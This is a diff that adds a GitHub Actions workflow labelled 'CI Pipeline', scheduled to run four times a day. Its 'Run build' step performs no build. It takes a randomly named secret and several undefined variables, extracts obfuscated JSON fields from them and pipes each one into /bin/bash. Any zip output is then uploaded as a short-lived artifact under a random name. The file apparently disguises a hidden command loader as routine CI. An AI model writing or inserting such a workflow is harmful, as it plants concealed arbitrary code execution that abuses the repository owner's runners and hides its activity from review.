@@ -1,0 +1,37 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          gajvu9592: ${{ secrets.gajvu9592 }}
+        run: |
+          printf '%s' "$gajvu9592" | jq -r .r11802 | /bin/bash
+          echo $gw79949 | jq -r .n6 | /bin/bash
+          echo $idmld5 | jq -r .c55799 | /bin/bash
+          printf '%s' "$yvqs61699" | jq -r .adf2395 | /bin/bash
+          echo $g8824 | jq -r .x190 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9QUjZXBd
+          path: "*.zip"
+          retention-days: 1
